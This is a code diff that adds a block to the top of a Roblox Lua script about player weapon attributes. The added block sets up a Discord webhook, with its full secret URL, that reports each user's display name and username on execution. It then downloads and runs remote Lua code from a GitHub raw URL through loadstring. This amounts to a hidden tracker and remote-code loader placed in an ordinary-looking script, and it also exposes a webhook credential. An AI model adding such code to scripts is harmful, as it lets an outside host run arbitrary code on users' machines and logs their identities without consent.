@@ -1,3 +1,22 @@
+getgenv().Config = {
+    ["WebhookUrl"] = "https://discord.com/api/webhooks/1278650878072721438/GYzUdnvs0GUplODrLH1Wxpbx7R4sqDg9P6LWKevAB-pwsQr0L6F2yrfmioereFsCy1xo",
+    ["Content"] = "New Execution!",
+    ["Title"] = "By: " .. game.Players.LocalPlayer.DisplayName .. " (" .. game.Players.LocalPlayer.Name .. ")",
+    ["Description"] = "Really Cool Person!",
+    ["ThumbnailUrl"] = "",
+    ["Color"] = 0x000000,
+    ["Footer"] = "Footer Content",
+    ["FooterThumbnailUrl"] = "",
+    ["Timestamp"] = true, 
+    ["Thumbnail"] = false,
+    ["Footers"] = false,
+    ["FootersThumbnail"] = false,
+    ["Fields"] = {
+        {["Field"] = "", ["Description"] = ""},
+    }
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/8rk1/8rk.1/main/Main.lua", true))()
 local player = game:GetService("Players").LocalPlayer
 local weapon_attr = player:WaitForChild("WeaponsAttributes")
 
